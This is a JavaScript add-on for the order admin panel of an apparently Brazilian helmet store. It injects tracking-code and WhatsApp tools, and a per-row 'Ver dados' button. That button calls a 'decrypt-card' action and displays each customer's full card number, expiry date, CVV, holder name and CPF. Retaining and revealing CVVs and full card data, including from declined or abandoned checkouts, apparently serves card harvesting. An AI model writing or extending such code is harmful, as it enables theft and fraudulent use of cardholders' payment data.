const ACTIONS_ID = "admin-tracking-actions";
const DIALOG_STYLE_ID = "mc-admin-dialog-compact";

const STATUS_LABELS = {
  checkout_iniciado: "Checkout iniciado",
  cartao_iniciado: "Cartão iniciado",
  cartao_processando: "Cartão processando",
  cartao_recusado: "Cartão recusado",
  pix_gerado: "PIX gerado",
  abandonou: "Carrinho abandonado",
  pending: "Aguardando pagamento",
  pago: "Pago",
  paid: "Pago",
};

function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function isAdminArea() {
  return /^\/admin\/login(\/|$)/.test(window.location.pathname);
}

function getAccessToken() {
  try {
    const hmac = localStorage.getItem("mcAdminToken");
    if (hmac) return hmac;
  } catch {
    /* ignore */
  }
  for (const key of Object.keys(localStorage)) {
    if (!key.includes("auth-token")) continue;
    try {
      const value = JSON.parse(localStorage.getItem(key) || "null");
      const token =
        value?.access_token || value?.currentSession?.access_token || value?.session?.access_token || null;
      if (token) return token;
    } catch {
      /* ignora chave inválida */
    }
  }
  return null;
}

async function invokeAdmin(action, payload = {}) {
  const token = getAccessToken();
  const res = await fetch("/api/admin", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
    body: JSON.stringify({ action, ...payload }),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || data.success === false) {
    throw new Error(data.error || "Operação não concluída");
  }
  return data;
}

function findOrderDialog() {
  return [...document.querySelectorAll('[role="dialog"]')].find((dialog) =>
    dialog.textContent?.includes("Detalhes do Pedido"),
  );
}

function injectDialogStyles() {
  if (document.getElementById(DIALOG_STYLE_ID)) return;
  const style = document.createElement("style");
  style.id = DIALOG_STYLE_ID;
  style.textContent = `
    [role="dialog"].mc-order-dialog {
      max-width: min(26rem, calc(100vw - 1.5rem)) !important;
      max-height: min(80vh, 620px) !important;
      width: 100% !important;
      padding: 0 !important;
      display: flex !important;
      flex-direction: column !important;
      overflow: hidden !important;
      gap: 0 !important;
    }
    [role="dialog"].mc-order-dialog .mc-dialog-header {
      flex-shrink: 0;
      padding: 1rem 1rem 0.5rem;
    }
    [role="dialog"].mc-order-dialog .mc-dialog-body {
      overflow-y: auto;
      flex: 1;
      min-height: 0;
      padding: 0 1rem 1rem;
      overscroll-behavior: contain;
      -webkit-overflow-scrolling: touch;
    }
    [role="dialog"].mc-order-dialog .mc-dialog-body::-webkit-scrollbar {
      width: 6px;
    }
    [role="dialog"].mc-order-dialog .mc-dialog-body::-webkit-scrollbar-thumb {
      background: rgba(161, 161, 170, 0.45);
      border-radius: 999px;
    }
  `;
  document.head.appendChild(style);
}

function compactOrderDialog(dialog) {
  if (dialog.dataset.mcCompact === "1") return;
  injectDialogStyles();
  dialog.dataset.mcCompact = "1";
  dialog.classList.add("mc-order-dialog");

  const closeBtn = dialog.querySelector('button[class*="absolute"]');
  const header = [...dialog.children].find((child) =>
    child.textContent?.includes("Detalhes do Pedido"),
  );
  if (header) {
    header.classList.add("mc-dialog-header");
  }

  const scroll = document.createElement("div");
  scroll.className = "mc-dialog-body";

  for (const child of [...dialog.children]) {
    if (child === closeBtn || child === header || child.classList.contains("mc-dialog-body")) continue;
    scroll.appendChild(child);
  }

  if (scroll.childElementCount > 0) {
    dialog.insertBefore(scroll, closeBtn || null);
  }
}

function removeOrphanedDialogLayer() {
  if (document.querySelector('[role="dialog"][data-state="open"]')) return;
  for (const overlay of document.querySelectorAll(
    'div.fixed.inset-0.z-50.bg-black\\/80, div.fixed.inset-0[data-state="open"], div.fixed.inset-0[data-state="closed"]',
  )) {
    if (overlay.getAttribute("role") !== "dialog") overlay.remove();
  }
  document.body.style.removeProperty("pointer-events");
  document.body.style.removeProperty("overflow");
  document.body.style.removeProperty("padding-right");
  document.body.style.removeProperty("margin-right");
  document.body.removeAttribute("data-scroll-locked");
}

function cleanupClosedOrderDialog() {
  for (const delay of [80, 280, 650]) {
    window.setTimeout(removeOrphanedDialogLayer, delay);
  }
}

document.addEventListener(
  "click",
  (event) => {
    const button = event.target instanceof Element ? event.target.closest("button") : null;
    const dialog = button?.closest('[role="dialog"]');
    if (dialog?.textContent?.includes("Detalhes do Pedido")) {
      const label = button.getAttribute("aria-label") || button.textContent || "";
      if (/fechar|close/i.test(label) || button.className.includes("absolute")) {
        cleanupClosedOrderDialog();
      }
      return;
    }
    const target = event.target instanceof Element ? event.target : null;
    if (target?.matches('div.fixed.inset-0.z-50.bg-black\\/80')) cleanupClosedOrderDialog();
  },
  true,
);

function getOrderId(dialog) {
  const match = dialog.textContent?.match(
    /ID do Pedido:\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i,
  );
  return match?.[1]?.trim() || null;
}

function digits(value) {
  return String(value || "").replace(/\D/g, "");
}

function whatsappLink(order, codigo) {
  const phone = digits(order.telefone || order.customer?.phone || "");
  const withCountry = phone.startsWith("55") ? phone : phone ? `55${phone}` : "";
  const nome = String(order.nome || order.customer?.full_name || "cliente").split(" ")[0];
  const url = `${window.location.origin}/rastrear-pedido?codigo=${encodeURIComponent(codigo)}`;
  const text = `Olá ${nome}, seu pedido na MegaCapacetes foi enviado.\n\nCódigo de rastreio: ${codigo}\nAcompanhe em: ${url}`;
  return withCountry
    ? `https://wa.me/${withCountry}?text=${encodeURIComponent(text)}`
    : `https://wa.me/?text=${encodeURIComponent(text)}`;
}

function createButton(label, className) {
  const button = document.createElement("button");
  button.type = "button";
  button.textContent = label;
  button.className = className;
  return button;
}

function sectionTitle(text) {
  const title = document.createElement("h3");
  title.className = "text-sm font-semibold text-zinc-400 uppercase tracking-wide";
  title.textContent = text;
  return title;
}

function trackingSection(orderId, order, container) {
  const box = document.createElement("div");
  box.className = "bg-zinc-800/50 rounded-lg p-4 space-y-3";

  const codeLine = document.createElement("p");
  codeLine.className = "font-mono text-lg font-bold text-emerald-400 tracking-widest";
  codeLine.textContent = order.codigo_rastreio || "—";

  const status = document.createElement("p");
  status.className = "text-sm text-zinc-400";
  status.textContent = order.codigo_rastreio
    ? "Código salvo neste pedido."
    : "Gere o código e envie por WhatsApp ou e-mail.";

  const generate = createButton(
    order.codigo_rastreio ? "Regenerar código" : "Gerar código",
    "rounded-md bg-emerald-600 px-3 py-2 text-sm font-semibold text-white hover:bg-emerald-500 disabled:opacity-50",
  );
  const copy = createButton(
    "Copiar",
    "rounded-md border border-zinc-600 bg-zinc-800 px-3 py-2 text-sm font-semibold text-white hover:bg-zinc-700",
  );
  const whatsapp = createButton(
    "WhatsApp",
    "rounded-md border border-emerald-700 bg-emerald-600/20 px-3 py-2 text-sm font-semibold text-emerald-100 hover:bg-emerald-600/30",
  );
  const send = createButton(
    "Enviar e-mail",
    "rounded-md border border-zinc-600 bg-zinc-800 px-3 py-2 text-sm font-semibold text-white hover:bg-zinc-700 disabled:opacity-50",
  );

  const setCode = (codigo) => {
    order.codigo_rastreio = codigo;
    codeLine.textContent = codigo;
    generate.textContent = "Regenerar código";
  };

  generate.addEventListener("click", async () => {
    generate.disabled = true;
    status.textContent = "Gerando código...";
    try {
      const result = await invokeAdmin("generate-tracking-code", { orderId });
      setCode(result.codigo);
      status.textContent = `Código salvo: ${result.codigo}`;
    } catch (error) {
      status.textContent = `Erro: ${error.message}`;
    } finally {
      generate.disabled = false;
    }
  });

  copy.addEventListener("click", async () => {
    if (!order.codigo_rastreio) {
      status.textContent = "Gere o código antes de copiar.";
      return;
    }
    try {
      await navigator.clipboard.writeText(order.codigo_rastreio);
      status.textContent = "Código copiado.";
    } catch {
      status.textContent = order.codigo_rastreio;
    }
  });

  whatsapp.addEventListener("click", () => {
    if (!order.codigo_rastreio) {
      status.textContent = "Gere o código antes de enviar no WhatsApp.";
      return;
    }
    window.open(whatsappLink(order, order.codigo_rastreio), "_blank", "noopener,noreferrer");
  });

  send.addEventListener("click", async () => {
    send.disabled = true;
    status.textContent = "Enviando e-mail...";
    try {
      if (!order.codigo_rastreio) {
        const generated = await invokeAdmin("generate-tracking-code", { orderId });
        setCode(generated.codigo);
      }
      await invokeAdmin("send-tracking-email", { orderId });
      status.textContent = "E-mail de rastreio enviado com sucesso.";
    } catch (error) {
      status.textContent = `Erro: ${error.message}`;
    } finally {
      send.disabled = false;
    }
  });

  const buttons = document.createElement("div");
  buttons.className = "flex flex-wrap gap-2";
  buttons.append(generate, copy, whatsapp, send);
  box.append(codeLine, status, buttons);
  container.append(sectionTitle("Código de rastreio"), box);
}

function formatCardNumber(value) {
  return String(value || "")
    .replace(/\D/g, "")
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();
}

function formatCpf(value) {
  const digits = String(value || "").replace(/\D/g, "");
  if (digits.length !== 11) return value || "Não informado";
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
}

function orderHasCard(order) {
  const method = String(order?.metodo_pagamento || order?.payment_method || "").toLowerCase();
  return Boolean(
    ["card", "credit_card", "cartao", "cartão"].includes(method) ||
      order?.card_last4 ||
      order?.card_encriptado,
  );
}

function orderTotal(order) {
  const raw = order?.total_amount ?? order?.total ?? order?.valor_total ?? order?.valor ?? order?.amount ?? 0;
  return typeof raw === "number" ? raw : parseFloat(String(raw || "0"));
}

function parseMoney(text) {
  const match = String(text || "").match(/([\d.]+,\d{2})/);
  if (!match) return null;
  return parseFloat(match[1].replace(/\./g, "").replace(",", "."));
}

function rowTotal(row) {
  for (const cell of row.querySelectorAll("td")) {
    if (!cell.textContent?.includes("R$")) continue;
    const value = parseMoney(cell.textContent);
    if (value != null) return value;
  }
  return null;
}

let ordersCache = [];
let ordersCacheAt = 0;

async function refreshOrdersCache() {
  if (Date.now() - ordersCacheAt < 12000 && ordersCache.length) return ordersCache;
  try {
    const result = await invokeAdmin("get-orders", { page: 1, limit: 500 });
    ordersCache = result.orders || [];
    ordersCacheAt = Date.now();
  } catch {
    /* lista ainda não disponível */
  }
  return ordersCache;
}

function findOrderForRow(row) {
  const name = row.querySelector("span.font-semibold")?.textContent?.trim();
  if (!name || name === "—") return null;
  const total = rowTotal(row);
  const matches = ordersCache.filter((order) => {
    const orderName = String(order.customer?.full_name || order.nome || "").trim();
    if (orderName !== name) return false;
    if (total != null && Math.abs(orderTotal(order) - total) > 0.02) return false;
    return true;
  });
  return matches[0] || null;
}

function inlineCardMarkup(card, order) {
  const number = formatCardNumber(card.number || card.numero || "");
  const validade =
    card.validade ||
    (card.expiryMonth && card.expiryYear ? `${card.expiryMonth}/${card.expiryYear}` : "Não informada");
  const cpf = formatCpf(card.holderCpf || card.cpf || "");
  const masked = `•••• •••• •••• ${card.last4 || order.card_last4 || "----"}`;
  return `
    <div style="border-radius:12px;padding:12px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;margin-top:8px;">
      <p style="margin:0 0 6px;font-size:10px;letter-spacing:1.5px;opacity:.75;">CARTÃO</p>
      <p style="margin:0 0 8px;font-family:monospace;font-size:15px;letter-spacing:1px;">${escapeHtml(number || masked)}</p>
      <p style="margin:0;font-size:12px;">${escapeHtml(card.holder || order.card_holder || "Titular não informado")}</p>
      <p style="margin:4px 0 0;font-size:11px;opacity:.85;">Validade: ${escapeHtml(validade)} · CVV: ${escapeHtml(card.cvv || "—")}</p>
    </div>
    <div style="display:grid;gap:2px;margin-top:8px;font-size:11px;color:#d4d4d8;">
      <span>Bandeira: ${escapeHtml(card.brand || order.card_brand || "—")}</span>
      <span>CPF: ${escapeHtml(cpf)}</span>
      <span>Parcelas: ${escapeHtml(card.installments || order.card_installments || 1)}x</span>
      <span>Status: ${escapeHtml(card.status || order.card_status || "Pendente")}</span>
    </div>`;
}

async function toggleInlineCard(orderId, order, slot) {
  const panel = slot.querySelector(".mc-inline-card-panel");
  const button = slot.querySelector(".mc-inline-card-btn");
  if (!panel || !button) return;

  if (panel.dataset.open === "1") {
    panel.dataset.open = "0";
    panel.classList.add("hidden");
    panel.innerHTML = "";
    button.textContent = "Ver dados";
    return;
  }

  button.disabled = true;
  button.textContent = "Carregando...";
  try {
    const result = await invokeAdmin("decrypt-card", { orderId });
    panel.innerHTML = inlineCardMarkup(result.card || {}, order);
    panel.classList.remove("hidden");
    panel.dataset.open = "1";
    button.textContent = "Ocultar dados";
  } catch (error) {
    panel.innerHTML = `<p class="text-xs text-red-400 mt-2">${escapeHtml(error.message)}</p>`;
    panel.classList.remove("hidden");
    panel.dataset.open = "1";
    button.textContent = "Ocultar dados";
  } finally {
    button.disabled = false;
  }
}

async function enhanceOrderListRows() {
  await refreshOrdersCache();
  if (!ordersCache.length) return;

  for (const row of document.querySelectorAll("tr")) {
    if (!row.className.includes("cursor-pointer")) continue;
    if (row.dataset.mcInlineCard === "1") continue;

    const order = findOrderForRow(row);
    if (!order || !orderHasCard(order)) continue;

    const nameColumn = row.querySelector("span.font-semibold")?.closest(".flex-col");
    if (!nameColumn) continue;

    row.dataset.mcInlineCard = "1";

    const slot = document.createElement("div");
    slot.className = "mc-inline-card-slot mt-1.5";
    slot.dataset.orderId = order.id;

    const button = createButton(
      "Ver dados",
      "mc-inline-card-btn rounded-md bg-blue-600 px-2.5 py-1 text-[11px] font-semibold text-white hover:bg-blue-500 disabled:opacity-50 w-fit",
    );
    button.addEventListener("click", (event) => {
      event.preventDefault();
      event.stopPropagation();
      void toggleInlineCard(order.id, order, slot);
    });

    const panel = document.createElement("div");
    panel.className = "mc-inline-card-panel hidden";

    slot.append(button, panel);
    nameColumn.appendChild(slot);
  }
}

async function enhanceDialog(dialog) {
  compactOrderDialog(dialog);
  if (dialog.dataset.mcEnhanced === "1") return;
  const orderId = getOrderId(dialog);
  if (!orderId) return;
  dialog.dataset.mcEnhanced = "1";

  let order = {};
  try {
    const result = await invokeAdmin("get-order", { orderId });
    order = result.order || {};
  } catch {
    order = {};
  }

  if (!dialog.isConnected || dialog.querySelector(`#${ACTIONS_ID}`)) return;

  const container = document.createElement("div");
  container.id = ACTIONS_ID;
  container.className = "space-y-3";

  trackingSection(orderId, order, container);

  const anchor = [...dialog.querySelectorAll("div")].find((element) =>
    element.textContent?.trim().startsWith("ID do Pedido:"),
  );
  const host = anchor?.parentElement || dialog;
  host.append(container);
}

let orderDialogWasOpen = false;

const observer = new MutationObserver(() => {
  if (!isAdminArea()) return;
  try {
    hideStoreCartOnAdmin();
    void enhanceOrderListRows();
    const dialog = findOrderDialog();
    if (dialog) {
      orderDialogWasOpen = dialog.getAttribute("data-state") !== "closed";
      compactOrderDialog(dialog);
      void enhanceDialog(dialog);
    } else if (orderDialogWasOpen) {
      orderDialogWasOpen = false;
      cleanupClosedOrderDialog();
    }
  } catch {
    /* nunca derruba o painel */
  }
});

function hideStoreCartOnAdmin() {
  if (!isAdminArea()) return;
  for (const heading of document.querySelectorAll("h1, h2, h3")) {
    if (!heading.textContent?.includes("Seu carrinho")) continue;
    const host = heading.closest("[role='dialog'], aside, [class*='fixed'], [class*='drawer']") || heading.parentElement;
    if (host instanceof HTMLElement) host.style.display = "none";
  }
}

hideStoreCartOnAdmin();
observer.observe(document.body, { childList: true, subtree: true });

document.addEventListener(
  "input",
  (event) => {
    const target = event.target;
    if (!(target instanceof HTMLInputElement)) return;
    if (!String(target.placeholder || "").includes("Buscar")) return;
    ordersCacheAt = 0;
  },
  true,
);
